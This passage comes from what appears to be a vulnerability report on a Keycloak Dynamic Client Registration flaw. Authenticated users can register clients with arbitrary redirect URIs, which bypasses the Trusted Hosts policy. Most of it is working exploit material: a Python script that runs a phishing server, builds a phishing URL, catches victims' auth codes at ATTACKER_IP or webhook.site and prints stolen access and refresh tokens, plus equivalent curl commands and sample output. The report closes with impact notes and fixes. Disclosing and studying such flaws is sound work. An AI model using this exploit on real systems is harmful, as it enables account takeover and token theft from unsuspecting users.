    if not use_webhook:
        step(5, "ATTACKER — Start phishing server (auth code catcher)")
        server = start_phishing_server(listen_port)
        success(f"Phishing server active on 0.0.0.0:{listen_port}")
        info("Server will capture auth code when victim is redirected here")
    else:
        step(5, "ATTACKER — Webhook.site ready to capture callback")
        success(f"webhook.site will capture auth code at: {callback_url}")
        info("No local server needed — webhook.site handles the redirect")

    # ══════════════════════════════════════════════════════════════
    # STEP 6: Generate phishing URL
    # ══════════════════════════════════════════════════════════════
    step(6, "ATTACKER — Generate phishing URL")

    phishing_url = (
        f"http://{kc_host}:{kc_port}/realms/{realm}/protocol/openid-connect/auth"
        f"?client_id={mal_client_id}"
        f"&response_type=code"
        f"&redirect_uri={urllib.parse.quote(callback_url, safe='')}"
        f"&scope=openid+profile+email"
    )

    print(f"""
  {RED}{BOLD}╔══════════════════════════════════════════════════════════════╗
  ║              PHISHING URL READY TO SEND                      ║
  ╚══════════════════════════════════════════════════════════════╝{RESET}

  {BOLD}{WHITE}Send this URL to the target victim:{RESET}

  {CYAN}{BOLD}{phishing_url}{RESET}

  {YELLOW}> This URL looks 100% legitimate (real Keycloak domain)
  > Victim will see the real Keycloak login page
  > After login, auth code is automatically sent to our server
  > Victim sees a fake "Login Successful" page{RESET}

  {BOLD}Waiting for victim to click the URL and log in...{RESET}
  {DIM}(Open the URL above in a browser to simulate victim){RESET}
  {DIM}Timeout: {args.timeout}s{RESET}
""")

    # ══════════════════════════════════════════════════════════════
    # STEP 7: Wait for victim
    # ══════════════════════════════════════════════════════════════
    step(7, f"Waiting for victim to log in... (timeout {args.timeout}s)")

    if args.auto_victim:
        info("--auto-victim mode: automatically simulating victim login...")
        victim_thread = threading.Thread(
            target=simulate_victim_login,
            args=(kc_host, kc_port, realm, mal_client_id, callback_url, listen_port),
            daemon=True)
        victim_thread.start()

    if use_webhook:
        # Poll webhook.site for the captured auth code
        code = webhook_poll_for_code(webhook_uuid, args.timeout)
        if code:
            captured_code_local = code
        else:
            captured_code_local = None
    else:
        # Wait for local phishing server to capture the code
        start_time = time.time()
        spinner = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
        idx = 0
        while not captured_event.is_set():
            elapsed = int(time.time() - start_time)
            remaining = args.timeout - elapsed
            if remaining <= 0:
                break
            print(f"\r  {YELLOW}{spinner[idx % len(spinner)]}{RESET} "
                  f"Waiting for victim... ({elapsed}s / {args.timeout}s) "
                  f"— Open URL in browser to simulate", end="", flush=True)
            idx += 1
            captured_event.wait(timeout=0.3)

        print("\r" + " " * 80 + "\r", end="")  # Clear spinner line
        captured_code_local = captured_code

    if not captured_code_local:
        fail(f"Timeout — no victim logged in within {args.timeout} seconds")
        print(f"\n  {YELLOW}Tip: Open the phishing URL in a browser, login as victim/Password123{RESET}")
        if server:
            server.shutdown()
        print_summary(results)
        return 1

    success("Victim auth code captured!")
    info(f"Auth code: {captured_code_local}")
    results.append(("Auth code captured via redirect", True))

    # ══════════════════════════════════════════════════════════════
    # STEP 8: Exchange auth code for victim tokens
    # ══════════════════════════════════════════════════════════════
    step(8, "ATTACKER — Exchange stolen auth code for victim tokens")

    status, token_resp = http_post_form(kc_host, kc_port,
        f"/realms/{realm}/protocol/openid-connect/token",
        {"client_id": mal_client_id,
         "client_secret": mal_secret,
         "grant_type": "authorization_code",
         "code": captured_code_local,
         "redirect_uri": callback_url})

    if "access_token" not in token_resp:
        fail(f"Token exchange failed: {token_resp}")
        if server:
            server.shutdown()
        print_summary(results)
        return 1

    claims = decode_jwt(token_resp["access_token"])

    print(f"""
  {RED}{BOLD}╔══════════════════════════════════════════════════════════════╗
  ║           VICTIM TOKEN SUCCESSFULLY STOLEN!                  ║
  ╚══════════════════════════════════════════════════════════════╝{RESET}

    {BOLD}Username     :{RESET} {RED}{claims.get('preferred_username', 'N/A')}{RESET}
    {BOLD}Email        :{RESET} {RED}{claims.get('email', 'N/A')}{RESET}
    {BOLD}Full Name    :{RESET} {RED}{claims.get('name', 'N/A')}{RESET}
    {BOLD}User ID      :{RESET} {RED}{claims.get('sub', 'N/A')}{RESET}
    {BOLD}Scope        :{RESET} {RED}{token_resp.get('scope', 'N/A')}{RESET}
    {BOLD}Access Token :{RESET} {RED}{token_resp['access_token']}{RESET}
    {BOLD}Refresh Token:{RESET} {RED}{token_resp.get('refresh_token', '')}{RESET}

  {YELLOW}{BOLD}Attacker now has full access to victim's account!{RESET}
""")
    results.append(("Victim token stolen", True))

    # ══════════════════════════════════════════════════════════════
    # STEP 9: Verify — access victim data
    # ══════════════════════════════════════════════════════════════
    step(9, "ATTACKER — Verify access to victim data with stolen token")

    status, userinfo = http_get_json(kc_host, kc_port,
        f"/realms/{realm}/protocol/openid-connect/userinfo",
        token_resp["access_token"])

    if status == 200:
        success("Victim userinfo accessed successfully:")
        for k, v in userinfo.items():
            if k not in ("sub",):
                print(f"    {k}: {v}")
        results.append(("Victim data access verified", True))
    else:
        warn(f"Userinfo failed (HTTP {status})")
        results.append(("Victim data access verified", False))

    if server:
        server.shutdown()
    print_summary(results)
    return 0


def print_summary(results):
    """Display test results summary."""
    vuln_count = sum(1 for _, v in results if v)

    print(f"""
{RED}{BOLD}╔══════════════════════════════════════════════════════════════╗
║                    RESULTS SUMMARY                           ║
╚══════════════════════════════════════════════════════════════╝{RESET}
""")
    for name, vuln in results:
        status_str = f"{RED}VULNERABLE{RESET}" if vuln else f"{GREEN}SECURE{RESET}"
        print(f"  {name:45s} {status_str}")

    print(f"""
{YELLOW}Attack Impact:{RESET}
  - User with create-client role can steal tokens of ANY realm user
  - Victim sees 100% legitimate Keycloak login page (trusted domain)
  - Stolen refresh token provides persistent access to victim account
  - One malicious client can phish all users in the realm

{YELLOW}Policy Gap:{RESET}
  - Anonymous DCR   : Trusted Hosts ENFORCED (correctly blocks)
  - Authenticated DCR: Trusted Hosts NOT PRESENT (allows any redirect_uri)
  - Admin REST API  : Returns 403 (correctly blocks)

{YELLOW}Root Cause:{RESET}
  The "Trusted Hosts" client registration policy only exists in the
  "anonymous" subType. The "authenticated" subType has no URI
  restriction policy whatsoever.
""")

    if vuln_count > 0:
        print(f"{RED}{BOLD}[!] VULNERABILITY CONFIRMED — {vuln_count}/{len(results)} tests positive{RESET}")
    else:
        print(f"{GREEN}{BOLD}[+] All tests passed — not vulnerable{RESET}")


if __name__ == "__main__":
    sys.exit(main())
```

---

### Step 3 — Simulate the Victim (Browser)

After the attack script starts and shows the **PHISHING URL READY TO SEND** message:

1. **Copy the phishing URL** from the script output
2. **Open that URL in any browser**
3. A **100% legitimate Keycloak login page** will appear — no suspicious signs
4. Login as the victim:
   - Username: `victim`
   - Password: `Password123`
5. After login, the victim sees a **"Login Successful!"** page (fake page from attacker's server)

### Expected Attack Output

```
╔══════════════════════════════════════════════════════════════╗
║  DCR Trusted Hosts Bypass                                    ║
║  Live Phishing Attack — Automated Token Theft                ║
║  Keycloak 26.5.4 — CVSS 8.0 (HIGH)                         ║
╚══════════════════════════════════════════════════════════════╝

[Step 1] ATTACKER — Login as testuser (has create-client role)
  [+] Login successful — token: eyJhbGciOiJSUzI1NiIsInR5cCI...

[Step 2] ATTACKER — Prepare callback endpoint
  [*] Callback URL: http://ATTACKER_IP:48888/callback

[Step 3] ATTACKER — Register malicious client via Dynamic Client Registration
  [+] Malicious client REGISTERED successfully!
      Client ID     : 425bebcb-...
      Client Secret : YDEWNkAW...
      Redirect URI  : http://ATTACKER_IP:48888/callback
  [!] Trusted Hosts policy NOT enforced for authenticated DCR!

[Step 4] CONTROL — Anonymous DCR (no authentication)
  [+] Anonymous DCR BLOCKED (correct): Policy 'Trusted Hosts' rejected...

[Step 5] ATTACKER — Start phishing server (auth code catcher)
  [+] Phishing server active on 0.0.0.0:48888

[Step 6] ATTACKER — Generate phishing URL

  ╔══════════════════════════════════════════════════════════════╗
  ║              PHISHING URL READY TO SEND                      ║
  ╚══════════════════════════════════════════════════════════════╝

  Send this URL to the target victim:

  http://KEYCLOAK:8080/realms/test/protocol/openid-connect/auth?client_id=...

[Step 7] Waiting for victim to log in...

  =======================================================
    *** VICTIM AUTH CODE CAPTURED! ***
  =======================================================
    Code: 7e7cad47-b4b2-e780-9295-6dd0c51e7e9e...
  =======================================================

[Step 8] ATTACKER — Exchange stolen auth code for victim tokens

  ╔══════════════════════════════════════════════════════════════╗
  ║           VICTIM TOKEN SUCCESSFULLY STOLEN!                  ║
  ╚══════════════════════════════════════════════════════════════╝

    Username     : victim
    Email        : victim@test.com
    Full Name    : Victim User
    Scope        : openid profile email
    Access Token : eyJhbGciOiJSUzI1NiIsInR5cCI...
    Refresh Token: eyJhbGciOiJIUzUxMiIsInR5cCI...

[Step 9] ATTACKER — Verify access to victim data with stolen token
  [+] Victim userinfo accessed successfully

[!] VULNERABILITY CONFIRMED — 4/4 tests positive
```

---

### Manual Step-by-Step (curl — For Detailed Understanding)

#### Attacker login and obtain token (public endpoint, no admin)

```bash
ATTACKER_TOKEN=$(curl -s -X POST http://<KEYCLOAK_IP>:8080/realms/test/protocol/openid-connect/token \
  -d "client_id=webapp&grant_type=password&username=testuser&password=Password123&scope=openid" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")
```

#### Register malicious client with redirect to attacker's server

```bash
REG_RESP=$(curl -s -X POST http://<KEYCLOAK_IP>:8080/realms/test/clients-registrations/openid-connect \
  -H "Authorization: Bearer $ATTACKER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "client_name": "Official Company App",
    "redirect_uris": ["http://ATTACKER_IP:48888/callback"],
    "grant_types": ["authorization_code","refresh_token"],
    "response_types": ["code"]
  }')
echo "$REG_RESP" | python3 -m json.tool
```

**Response (201 Created — WITHOUT Trusted Hosts rejection):**

```json
{
  "client_id": "425bebcb-4dc1-4467-adf1-6d20815712b3",
  "client_secret": "YDEWNkAWu6BanGdCamm8wGGZmHcWXz7D",
  "redirect_uris": ["http://ATTACKER_IP:48888/callback"],
  "grant_types": ["authorization_code", "refresh_token"]
}
```

#### Control: Anonymous DCR (correctly rejected)

```bash
curl -s -X POST http://<KEYCLOAK_IP>:8080/realms/test/clients-registrations/openid-connect \
  -H "Content-Type: application/json" \
  -d '{"client_name":"anon-test","redirect_uris":["http://ATTACKER_IP:48888/callback"]}'
```

```json
{
  "error": "insufficient_scope",
  "error_description": "Policy 'Trusted Hosts' rejected request... Host not trusted."
}
```

#### Generate phishing URL

```
http://<KEYCLOAK_IP>:8080/realms/test/protocol/openid-connect/auth?
  client_id=425bebcb-4dc1-4467-adf1-6d20815712b3&
  response_type=code&
  redirect_uri=http%3A%2F%2FATTACKER_IP%3A48888%2Fcallback&
  scope=openid+profile+email
```

This URL is 100% legitimate — real Keycloak domain. The victim has no reason to be suspicious.

#### Victim clicks URL, logs in, auth code captured

Victim sees the real Keycloak login page. After logging in, Keycloak redirects to the attacker's server:

```
HTTP 302 → http://ATTACKER_IP:48888/callback?code=7e7cad47-b4b2-e780-9295-6dd0c51e7e9e...
```

The attacker's server automatically captures the auth code and displays a fake "Login Successful!" page.

#### Attacker exchanges auth code for victim's token

```bash
curl -s -X POST http://<KEYCLOAK_IP>:8080/realms/test/protocol/openid-connect/token \
  -d "client_id=$MAL_CLIENT_ID" \
  -d "client_secret=$MAL_SECRET" \
  -d "grant_type=authorization_code" \
  -d "code=$AUTH_CODE" \
  -d "redirect_uri=http://ATTACKER_IP:48888/callback"
```

**Victim's token successfully stolen:**

```
Username     : victim
Email        : victim@test.com
Full Name    : Victim User
Scope        : openid profile email
Access Token : eyJhbGciOiJSUzI1NiIsInR5cCI...
Refresh Token: eyJhbGciOiJIUzUxMiIsInR5cCI...
```

#### Verify: access victim data with stolen token

```bash
curl -s http://<KEYCLOAK_IP>:8080/realms/test/protocol/openid-connect/userinfo \
  -H "Authorization: Bearer $VICTIM_ACCESS_TOKEN"
```

```json
{
  "email_verified": true,
  "name": "Victim User",
  "preferred_username": "victim",
  "email": "victim@test.com"
}
```

---

## Impact

- **Full token theft:** A user with the `create-client` role can steal the token of any user in the realm, including administrators, by registering a malicious client and phishing via the real Keycloak login page.
- **No compromise indicators for the victim:** The login page is on the real Keycloak domain with HTTPS. There are no suspicious UI elements, no browser warnings.
- **Persistent access:** The stolen refresh token provides ongoing access until the victim changes their password.
- **Bypasses all redirect_uri allowlisting:** The `Trusted Hosts` protection configured by the admin does not apply to authenticated DCR.
- **Scales to all users in the realm:** A single malicious client registration can phish all users. The attacker only needs to distribute the URL.

---

## Recommendations

- **Apply the `Trusted Hosts` policy to subType `authenticated`.** The same URI validation must be enforced for authenticated registrations. This is the primary fix.
- **Require admin approval for DCR clients.** Add a `client-disabled` policy to the authenticated subType so new clients require admin activation before they can initiate auth flows.
- **Add URI domain validation to the `authenticated` policy set.** Restrict `redirect_uris` to pre-approved domains.
- **Audit clients already registered via DCR** for redirect URIs that should not be there.

## Supporting Material/References

- PoC video: *(to be added)*
